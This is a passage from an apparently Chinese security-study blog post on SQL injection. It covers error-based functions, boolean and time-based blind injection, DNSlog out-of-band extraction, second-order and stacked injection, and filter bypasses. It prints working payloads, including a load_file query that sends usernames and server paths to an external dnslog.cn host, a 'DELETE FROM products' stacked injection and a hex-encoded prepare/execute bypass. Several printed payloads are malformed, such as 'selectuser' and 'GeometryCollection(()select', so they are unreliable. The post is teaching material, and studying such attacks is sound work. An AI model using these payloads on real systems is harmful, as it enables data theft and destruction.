src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021930830.png"></p><p>然后，爆表名 -&gt;爆列名-&gt;爆用户数据</p><p>具体语句还是见sqli-labs中具体的例子</p><p><strong>4、<code>NAME_CONST()</code></strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(selectname_const(@<span class="hljs-variable">@version</span>,<span class="hljs-number">0</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> name_const(@<span class="hljs-variable">@version</span>,<span class="hljs-number">0</span>)) <span class="hljs-keyword">as</span> b) <span class="hljs-keyword">as</span> c);<br></code></pre></td></tr></table></figure><p><strong>5、 <code>jion()</code></strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.user <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> mysql.user <span class="hljs-keyword">as</span> b)<span class="hljs-keyword">as</span> c;<br></code></pre></td></tr></table></figure><p><strong>6、<code>exp()</code></strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> ())<span class="hljs-keyword">as</span> a));<br></code></pre></td></tr></table></figure><p><strong>7、<code>geometryCollection()</code></strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">GeometryCollection(()<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> () )a)b );<br></code></pre></td></tr></table></figure><p><strong>8、<code>polygon()</code></strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">polygon (()<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> ())a)b );<br></code></pre></td></tr></table></figure><p><strong>9、<code>multipoint()</code></strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">multipoint (()<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() )a)b );<br></code></pre></td></tr></table></figure><p><strong>10、<code>multlinestring()</code></strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">multlinestring (()<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(selectuser () )a)b );<br></code></pre></td></tr></table></figure><p><strong>11、<code>multpolygon()</code></strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">multpolygon (()<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(selectuser () )a)b );<br></code></pre></td></tr></table></figure><p><strong>12、<code>linestring()</code></strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">linestring (()<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() )a)b );<br></code></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://blog.csdn.net/2301_80913334/article/details/137569872" title="sql注入之报错注入_报错注入函数-CSDN博客">sql注入之报错注入_报错注入函数-CSDN博客</a></p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p><strong>一、定义及分类</strong></p><p>盲注就是在sql注入过程中，sql语句执行select之后，可能由于网站代码的限制或者apache等解析器配置了不回显数据，造成在select数据之后不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个判断的过程称之为盲注。</p><p>简单来说，就是回显的内容很少或没有回显（报错也是一种回显），不能通过回显看出有用的东西，就像盲了一样，所以叫盲注</p><p>所以我们总结出盲注的使用条件：</p><p>页面没有显示位（如果有显示位可以选择union联合查询），并且没有返回sql语句的执行错误信息。</p><p>只有在这种条件下我们才用盲注，因为盲注本质上就是不断地尝试，试出来我们想要的信息，所以盲注要发送大量的请求，对服务器占用较大，容易被禁止。盲注一般不被优先考虑，在不同情况下往往考虑有没有特殊方法解决，比如下文的DNS log注入。</p><p><strong>分类</strong></p><ul><li>基于布尔类型的盲注</li><li>基于时间类型的盲注</li></ul><p>在符合上文所说的条件下，我们怎么判断用哪种类型的盲注呢？</p><p>布尔盲注：网页返回的结果只有两种，输入的错误与正确，没有其他有效信息</p><p>时间盲注：页面上没有显示位和SQL语句执行的错误信息，正确执行和错误执行的返回界面一样</p><p><strong>二、实现过程</strong></p><p>从数据库名、表名到字段名，最后到用户数据，两种盲注都是不断重复‘提取数据长度’、‘提取数据内容’这两个步骤，过程非常繁琐，我们往往借助工具，比如sqlmap（使用方法见下文）或burpsuite</p><p><strong>1、布尔盲注</strong></p><p>以爆数据库名为例，先求出库名长度，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> length((<span class="hljs-keyword">select</span> database()))<span class="hljs-operator">=</span><span class="hljs-number">8</span> <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>然后逐个字符确定，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>也可以把substr((select database()),1,1)转换成ASCII码，</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">ASCII(<span class="hljs-name">substr</span>((<span class="hljs-name">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><p>然后对照ASCII码表用数字依次尝试，也可以用&gt;或&lt;进行判断，这样就不需要逐个数字一一尝试，进一步可以使用二分查找，去减少请求次数</p><p><strong>2、时间盲注</strong></p><p>以数据库名为例，判断数据库长度：如果长度为1就延迟5s，不是就返回1。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> if(length(database())<span class="hljs-operator">=</span><span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)# <br></code></pre></td></tr></table></figure><p>有兴趣的话可以写一个python爬虫，通过判断响应时间来逐个确定字符，工具的原理大概就是这样。</p><p>当然，我们一般用sqlmap，用现成的工具会更方便一点。</p><p>但是要是对盲注只会用工具而没有其他办法，也是不行的，自己会写盲注的脚本才能算真的会盲注。</p><p><strong>接下来我们再学习一些特殊的注入方式</strong></p><h3 id="DNS-log注入"><a href="#DNS-log注入" class="headerlink" title="DNS log注入"></a>DNS log注入</h3><p><strong>一、什么是DNSlog</strong></p><p>虽然因特网上的节点都可以用IP地址标识，并且可以通过IP地址被访问，但即使是将32位的二进制IP地址写成4个0～255的十位数形式，也依然太长、太难记。因此，人们发明了域名(Domain Name)，域名可将一个IP地址关联到一组有意义的字符上去。用户访问一个网站的时候，既可以输入该网站的IP地址，也可以输入其域名，对访问而言，两者是等价的。例如：微软公司的Web服务器的IP地址是207.46.230.229，其对应的域名是<a href="http://www.microsoft.com,不管用户在浏览器中输入的是207.46.230.229还是www.microsoft.com,都可以访问其web网站./">www.microsoft.com，不管用户在浏览器中输入的是207.46.230.229还是www.microsoft.com，都可以访问其Web网站。</a></p><p>简单来说，大家一开始用一串数字（ip地址）来表示网络上各个节点（网站），但这个太难记了，所以又给这些ip地址起了个别名（域名），域名与ip地址是等价的，只不过域名更好记。只使用域名虽然方便了我们，但实际上还需要把域名转换成ip地址再访问，所以我们引出DNS。</p><p><strong>DNS</strong>：域名系统（英文：Domain Name System，缩写为DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><p>简单来说，DNS就是一项将域名解析为ip的服务，各种域名与其对应的ip地址就存储在它的服务器上，用户在浏览器上输入一个域名A.com，就要靠DNS服务器将A.com解析到它的真实ip，这样就可以访问真实ip服务器上的相应服务。</p><p><strong>那么DNSlog是什么呢？</strong></p><p>log有日志的意思，DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对各种域名的访问信息，类似日志文件，也有点像浏览记录。</p><p><strong>为什么要进行DNSlog注入呢？</strong></p><p>一般情况下，在我们无法通过联合查询直接获取数据的情况下，我们只能通过盲注，来一步步的获取数据，但是使用盲注去手工测试是需要花费大量的时间的，我们可能会想到使用sqlmap直接去跑出数据，但在实际测试中，使用sqlmap跑盲注，会有很大的几率使得网站把我们IP给封掉，这就影响了我们的测试进度。</p><p>这种情况下用DNSlog注入就是必要的，下面我们进一步确定DNSlog注入的适用范围。</p><p><strong>DNSlog注入通常用在哪些地方？</strong></p><p>SQL注入中的盲注（布尔盲注、时间盲注），注入的效率低且线程高容易被waf拦截，往往采用DNSlog注入。</p><p>又或者是目标站点没有回显：无回显的命令执行，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功；无回显的SSRF，也不能给出有效信息。</p><p>那怎么利用DNSlog进行注入呢？这得深入了解一下DNSlog。</p><p><strong>二、DNSlog回显原理</strong></p><p>因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。如：</p><p>tieba.baidu.com</p><p>它由三个标号组成， com即为顶级域名，baidu为二级域名，tieba即为三级域名。且域名不分区大小写。</p><p>我们简单看看下面图片，</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021931448.png"></p><p><strong>（重点！！！）</strong></p><p>域名从右向左解析，用 . 分割级别，低级别的域名要在高级别的域名中去解析，所以当tieba.baidu.com去baidu.com中去解析的时候，就会留下解析记录，通过获取前来解析的低级域名前缀来获取我们需要的信息。</p><p>所以我们首先需要一个可以自己配置的域名，比如：ceye.io，然后通过代理商设置域名ceye.io的nameserver为自己的服务器A，然后在服务器A上配置好DNS server，这样以来所有ceye.io及其子域名的查询都会到服务器A上，这时就能够实时地监控域名查询请求了。</p><p>（当然，这里也可以用免费的记录dnslog的平台来代替这些步骤，比如<a href="http://www.dnslog.cn/" title="DNSLog Platform">DNSLog Platform</a>）</p><p>那么上面说的这些和我们这个DNS log注入有什么关系？DNS在解析的时候会留下记录，然后我们可以读取这个多级域名的解析日志来获取我们所想要的内容。</p><p><strong>三、注意要点及踩坑记录</strong></p><p>**1、dnslog回显只能用于windows系统。**sql盲注的后端数据库只能在windows系统中，原理就是’\\\\‘代表Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。双斜杠表示网络资源路径多加两个\就是转义了反斜杠。</p><p>为什么DNSlog注入只能用于windows系统？答：load_file()函数在Linux下是无法用来做DNSLog攻击的，因为linux没有<strong>UNC</strong>这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的。</p><p>什么是UNC路径？</p><p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。UNC 代表通用（或一致、统一）命名约定，是一种用于访问计算机网络上的文件夹和文件的语法。</p><p>语法如下：</p><p><code>\\&lt;computer name&gt;\&lt;shared directory&gt;\</code></p><p>路径结构可以后跟任意数量的目录，并以目录或文件名终止，例如：</p><p><code>\\pondermatic\public\studyarea.gdb</code></p><p><code>\\omni\shared_stuff\wednesday\tools</code></p><p>计算机名称的前面始终使用双反斜线 (\\)。</p><p>在 UNC 中，计算机名称又称为主机名称。</p><p>对于 UNC 路径，存在以下几条规则：</p><ul><li>UNC 路径不能包含盘符（如 D）。</li><li>不能浏览至共享目录的上级目录。</li><li>用于文档和工具的存储相对路径名选项对 UNC 路径不起作用。</li></ul><p><strong>2、需要用到mysql中的load_file()函数</strong>，在Mysql中，load_file()函数读取一个文件并将其内容作为字符串返回。</p><p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。</p><p>在mysql中运行：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p>查看load_file()可以读取的磁盘。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021932970.png"></p><p>1）、当secure_file_priv为空，就可以读取磁盘的目录。（上方图片就是这种情况）</p><p>2）、当secure_file_priv为G:\，就可以读取G盘的文件。（其他盘也是如此）</p><p>3）、当secure_file_priv为null，load_file就不能加载文件。</p><p>如果secure_file_priv为null，就说明没有权限，不能用load_file()函数。下面就是如何修改权限。</p><p>若我们用的phpstudy，点击设置，点击文件位置，找到MySQL版本并点击</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021932032.png"></p><p>找到并点击my.ini文件</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021932543.png"></p><p>找找有没有secure_file_priv 参数，没有就加上 </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">secure_file_priv <span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>注意等号后面什么也没有，而且注意添加的位置（下图最后），添加位置不对没有效果（含泪大坑）。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021932763.png"></p><p>重启并再次输入<code>show variables like &#39;%secure%&#39;;</code>（记住重启）</p><p>secure_file_priv为空而不是NULL，就表示成功了</p><p><strong>3、域名解析需要注意：</strong></p><p>由于每一级域名的长度只能为63个字符，所以在mysql中获取到超过63个字节的字符时，会被当作一个错误的域名，不会产生去解析的动作，所以tbk74h.dnslog.cn也不会收到解析的记录，所以我们就获取不到想要的信息了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021932831.png"></p><p>域名里有一个规则，只能出现数字，字母，下划线；所以在获取到的信息中包含了其他特殊符号时，load_file就会认为是一个错误的域名，就不会去从网络中解析了。</p><p>如：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021932113.png"></p><p>当前数据库名为security，是以字母开头的，在域名规则内是允许的，所以load_file会向域名进行解析</p><p>当在域名中拼接一个@符号时，就不会进行解析</p><p><img src="https://i-blog.csdnimg.cn/direct/2099df0022fc4dbdbdb596426723e5d2.png"></p><p>也就不会有解析记录</p><p>我们在使用group_concat合并查询时，会自动使用 “,” 连接我们查询到的每值，但是由于 , 在url中是不允许出现的，所以使用group查询到的值去解析时候，mysql就会认为这不是一个url地址，就不会出现解析的操作，所以就没法获取到值</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021933517.png"></p><p>总结下来，就是域名长度和特殊符号的问题。</p><p>下面我们给出如何解决。</p><p><strong>四、利用过程</strong></p><p>接下来我们用<a href="http://www.dnslog.cn/" title="DNSLog Platform">DNSLog Platform</a> 生成一个网址qnpqsu.dnslog.cn（点击Get SubDomain）</p><p>上面提到了各种与域名解析冲突的情况，尤其是group_concat()函数的逗号问题。</p><p>不过事情总是有解决的办法的，通过使用replace，substr等函数，成功绕过了url解析的问题，如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> SUBSTR(replace((group_concat(username )),<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">63</span>) <span class="hljs-keyword">from</span> users),<span class="hljs-string">&#x27;.qnpqsu.dnslog.cn/abc&#x27;</span>))<br></code></pre></td></tr></table></figure><p>通过正则替换将replace中的 “ ，”全部替换为 “ _ ” 这样就可以符合url的解析规则了（但要是username本来就有_，那对我们来说就是麻烦事了），并且我们只需要将查询结果的字符长度控制在63个就可以了。</p><p>因为load_file()函数访问的是文件，所以域名后面需要添加&#x2F;abc，当然&#x2F;aaa也可以，后面的文件名随便编一个就可以，\\aaa也是可以的，但\aaa不可以。</p><p>如图：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021933589.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021933282.png"></p><p>上面我们提到username如果本来就有_，那对我们来说又是麻烦事，有人说我们可以不用_，用别的符号，但username也有可能会用别的符号。</p><p>不过我们有别的方法。</p><p>那就是转换为16进制来避免字符过滤，推荐这种方法，它更全面且不易混淆符号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> LOAD_FILE(CONCAT(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(SUBSTR(HEX(@<span class="hljs-variable">@basedir</span>),<span class="hljs-number">1</span>,<span class="hljs-number">60</span>)),<span class="hljs-string">&#x27;.DNSlog网址\abc&#x27;</span>))<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021933913.png"></p><p>然后再用在线16进制字符串转换工具转换出来，比如<a href="https://tool.hiofd.com/hex-convert-string-online/" title="在线16进制字符串转换工具 - 在线工具网">在线16进制字符串转换工具 - 在线工具网</a></p><p>参考文献：</p><p><a href="https://www.freebuf.com/articles/web/259023.html" title="DNSlog注入详细解析 - FreeBuf网络安全行业门户">DNSlog注入详细解析 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.cnblogs.com/Xy--1/p/12896599.html" title="DNSlog注入学习 - Lushun - 博客园">DNSlog注入学习 - Lushun - 博客园</a></p><p><a href="https://blog.csdn.net/kukudeshuo/article/details/115804250" title="DNSlog注入_&lt;!doctype syscode system ">DNSlog注入_</a></p><p><a href="https://www.jianshu.com/p/f2c08353c8d8" title="DNS log注入 - 简书">DNS log注入 - 简书</a>（DNSlog注入踩坑记录）</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p><strong>一、什么是二次注入？</strong></p><p>简单的说，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p><p>网站对我们输入的一些重要的关键字进行了转义，但是这些我们构造的语句已经写进了数据库，可以在没有被转义的地方使用</p><p>可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入。</p><p><strong>普通注入</strong></p><p>（1）在http后面构造语句，是立即直接生效的</p><p>（2）一次注入很容易被扫描工具扫描到</p><p><strong>二次注入</strong></p><p>（1） 先构造语句（有被转义字符的语句）</p><p>（2）我们构造的恶意语句存入数据库</p><p>（3）第二次构造语句（结合前面已经存入数据库的语句，成功。因为系统没有对已经存入数据库的数据做检查）</p><p>（4）二次注入更加难以被发现</p><p><strong>二、二次排序注入思路</strong></p><p>1、黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。</p><p>2、服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</p><p>3、黑客向服务端发送第二个与第一次不相同的请求数据信息。</p><p>4、服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。</p><p>5、服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</p><p><strong>简单来说，就是我们提交了注入语句，比如注册用户（起了用户名，用户名是注入语句），可能是被过滤或特意设置，没发生效果，只是存到了数据库里，当我们在再次用这个语句时，比如更改用户密码（查询用户名），它从数据库里读取出来（这时候开发人员没有过滤注入语句，我们用户名里的注入语句执行了），虽然我们没重新写注入语句，但原来的注入语句在读取时发生效果了，注入最终还是成功了。</strong></p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p><strong>一、什么是堆叠注入？</strong></p><p>堆叠用简单通俗的话来解释就是多条命令一起执行，比如在MySQL中我们知道在输入一个命令之后要用;表示一个指令的输入完成，那么我们就想是否可以在一句指令之后用；断开然后再加上一句指令。按照这样多条命令进行注入就是堆叠注入。</p><p><strong>二、堆叠注入原理：</strong></p><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在分号（;）结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。</p><p>用户输入：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-number">1</span>; <span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> products<br></code></pre></td></tr></table></figure><p>服务器端生成的sql语句为：（因未对输入的参数进行过滤）</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">Select</span> * <span class="hljs-keyword">from</span> products <span class="hljs-keyword">where</span> productid=<span class="hljs-number">1</span>;<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> products<br></code></pre></td></tr></table></figure><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。所以堆叠注入更随意，威力更加巨大。</p><p><strong>三、局限性：</strong></p><p>    并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</p><p>    在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略。</p><p>使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等，这个就是为什么我们尝试用 union select 联合查询的原因。</p><p>其实从实际来讲，堆叠注入最大的局限就在于它太少见了，由于堆叠注入威力过于巨大，开发者往往不会给用户开放多条语句的权限，从而使堆叠注入根本行不通。</p><p><strong>四、利用：</strong></p><p>和正常注入基本相同，区别在于可以多写几条语句，能进行删库等操作。</p><p>这里就不讲常规的select语句了，我们提一下不用select的（有select过滤时）。</p><p>先爆出数据库。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">0</span>&#x27;; <span class="hljs-keyword">show</span> databases; <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>然后尝试爆表。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">0</span>&#x27;; <span class="hljs-keyword">show</span> tables; <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>爆表</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">0</span>&#x27;; show columns <span class="hljs-keyword">from</span> <span class="hljs-built_in">words</span>; <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>至于报数据，如果不利用select，也是有方法的。</p><p>比如<strong>HANDLER命令</strong>或者编码后预处理，这里简单提一下。</p><p>这里我们假设表名为words，然后我们想执行select * from words</p><p>我们payload为</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;SeT@a=0x<span class="hljs-number">7365</span>6C<span class="hljs-number">65637420</span>2A<span class="hljs-number">206672</span>6F6D<span class="hljs-number">2077</span>6F<span class="hljs-number">726473</span>;prepare execsql from @a;execute execsql;#<br></code></pre></td></tr></table></figure><p>解释如下， </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0x73656C656374202A2066726F6D20776F726473</span>是对<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> words进行了<span class="hljs-number">16</span>进制编码<br><span class="hljs-keyword">prepare</span>…<span class="hljs-keyword">from</span>…是预处理语句，会进行编码转换。<br><span class="hljs-keyword">execute</span>用来执行由SQLPrepare创建的<span class="hljs-keyword">SQL</span>语句。<br><span class="hljs-keyword">SELECT</span>可以在一条语句里对多个变量同时赋值，而<span class="hljs-keyword">SET</span>只能一次对一个变量赋值。<br></code></pre></td></tr></table></figure><p>这样就绕过select执行成功了。</p><p><strong>然后我们详解一下HANDLER命令，</strong></p><p><code>HANDLER</code>命令提供了一种比SELECT更直接的访问表数据的方式：</p><ul><li><p>不需要完整的SQL解析</p></li><li><p>性能更高</p></li><li><p>但功能有限，主要用于顺序扫描表</p></li></ul><p>常见HANDLER操作：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">OPEN</span> - 打开表<br> <br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> FIRST - 读取第一行<br> <br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> NEXT - 读取下一行<br> <br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">CLOSE</span> - 关闭表<br></code></pre></td></tr></table></figure><p>下面是举例payload</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-number">1</span>&#x27;; handler `FlagHere` <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> `a`; handler `a` read next;#<br></code></pre></td></tr></table></figure><p>payload解释如下</p><p>第一个操作：handler `FlagHere` open as `a`</p><ul><li><p><code>HANDLER</code>是MySQL特有的低级表访问接口</p></li><li><p>语法：<code>HANDLER table_name OPEN [AS alias]</code></p></li><li><p>这里打开名为<code>FlagHere</code>的表，并赋予别名<code>a</code></p></li><li><p>反引号(``)用于包裹表名，防止特殊字符引起问题</p></li></ul><p>第二个操作：handler `a` read next</p><ul><li><p>使用之前打开的handler别名<code>a</code></p></li><li><p><code>READ NEXT</code>从表中读取下一行数据</p></li><li><p>这会返回表中的第一行内容(因为这是第一次调用)</p></li></ul><h2 id="混淆与绕过"><a href="#混淆与绕过" class="headerlink" title="混淆与绕过"></a>混淆与绕过</h2><p>普通注入方式过于明显，很容易被检测，因此需要改变攻击手法，绕过检测和过滤，即混淆和绕过。注意所有的技巧都是分情况的。</p><p><strong>一、常见方法</strong></p><p>1、编码绕过（URL编码）</p><p>空格可以URLcode为<code>%20</code>。</p><p>常规代替空格的字符及其URL编码：</p><p><code>%09</code> TAB 键（水平）；</p><p><code>%0a</code> 新建一行；</p><p><code>%0b</code> TAB 键（垂直）；</p><p><code>%0c</code> 新的一页；</p><p><code>%0d</code> return 功能；</p><p><code>%a0</code> 空格。</p><p>2、大小写转换绕过</p><p><code>union</code>变为<code>uNion</code>。</p><p>但是所有大小写的情况都会被替换咋办？</p><p>3、双写绕过（包裹绕过）</p><p><code>UNIunionON</code>。</p><p>只适用于服务端做一次处理的情况，如果是递归过滤写多少次都没用。</p><p>还可以用注释<code>/*!*/</code>包裹字符，例如<code>/*!union*/</code>。</p><p>4、多个参数绕过</p><p>有时候开发人员由于疏忽，只会对第一个参数过滤，我们可以传递多个参数，在后面参数处写注入代码，例</p><p><code>id=1 &amp; id=0&#39; union select 1,2,3--+</code></p><p>5、近似替换</p><p>可代替where的字符：<code>Limit;Having;like</code></p><p>除了上面常规代替空格的字符外，多行注释<code> /**/</code> 